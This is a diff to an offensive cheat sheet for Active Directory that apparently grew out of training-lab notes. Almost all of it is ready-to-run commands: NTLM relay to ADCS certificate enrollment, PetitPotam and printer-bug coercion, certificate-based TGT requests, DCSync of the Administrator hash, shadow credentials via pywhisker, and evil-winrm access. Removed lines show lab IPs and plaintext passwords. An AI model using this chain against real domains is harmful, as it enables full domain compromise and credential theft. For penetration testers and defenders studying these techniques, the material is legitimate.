@@ -8,39 +8,72 @@
 
 ### Set Up Relay
 
-```
-impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```bash
+# Template depends on target - DomainController for DCs, KerberosAuthentication for others
+ntlmrelayx.py -debug -smb2support --target http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController
 ```
 
-### Coerce Authentication (Printer Bug)
+### Coerce Authentication
 
-```
+```bash
+# PetitPotam (MS-EFSRPC) - often works unauthenticated
+python3 PetitPotam.py <attacker_ip> <dc_ip>
+
+# Printer Bug (MS-RPRN) - requires valid creds
 python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
 ```
 
-### Obtain TGT from Certificate (gettgtpkinit.py)
+### Obtain TGT from Certificate
 
-```
-python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+```bash
+python3 gettgtpkinit.py <DOMAIN>/<DC$> -cert-pfx <cert.pfx> -dc-ip <dc_ip> dc.ccache
 ```
 
 ### DCSync with Machine Account TGT
 
-```
-export KRB5CCNAME=/tmp/dc.ccache
-impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+```bash
+export KRB5CCNAME=dc.ccache
+secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DC_FQDN>
 ```
 
-## Shadow Credentials (pywhisker)
+### Alternative: Get NT Hash Directly from TGT
 
-### Add Shadow Credential
-
+```bash
+python3 getnthash.py -key <as_rep_key> <DOMAIN>/<DC$>
 ```
-pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+
+### Certipy (All-in-One Alternative)
+
+```bash
+certipy auth -pfx <cert.pfx> -dc-ip <dc_ip> -domain <DOMAIN>
+
+# If PKINIT fails (DC doesn't support it), fall back to ldap-shell
+certipy auth -pfx <cert.pfx> -dc-ip <dc_ip> -ldap-shell
+```
+
+### Windows: Rubeus with Certificate
+
+```powershell
+.\Rubeus.exe asktgt /user:<DC$> /certificate:<base64_cert> /ptt
+```
+
+## Shadow Credentials (msDS-KeyCredentialLink)
+
+### Add Shadow Credential (Linux)
+
+```bash
+pywhisker --dc-ip <dc_ip> -d <DOMAIN> -u <user> -p '<pass>' --target <target_user> --action add
 ```
 
 ### Obtain TGT from Shadow Credential PFX
 
+```bash
+python3 gettgtpkinit.py -cert-pfx <cert.pfx> -pfx-pass '<password>' -dc-ip <dc_ip> <DOMAIN>/<target_user> /tmp/target.ccache
 ```
-python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+### Use the TGT
+
+```bash
+export KRB5CCNAME=/tmp/target.ccache
+evil-winrm -i <dc_fqdn> -r <domain>
 ```
